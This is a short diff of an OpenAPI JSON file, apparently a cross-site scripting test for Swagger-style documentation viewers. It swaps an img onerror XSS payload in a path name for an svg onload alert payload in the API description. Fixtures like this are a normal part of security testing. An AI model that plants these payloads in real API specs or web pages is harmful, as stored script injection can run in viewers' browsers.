@@ -1,13 +1,14 @@
 {
   "openapi": "3.0.1",
   "info": {
-    "title": "Test",
+    "title": "Swagger XSS Test",
+    "description": "<svg onload=alert(document.domain)>",
     "version": "1.0"
   },
   "paths": {
-    "/pwned\"></textarea><img src=1 onerror=\"alert('XSS')\">": {
+    "/test": {
       "get": {
-        "summary": "XSS PoC",
+        "summary": "Test summary",
         "responses": {
           "200": {
             "description": "OK"
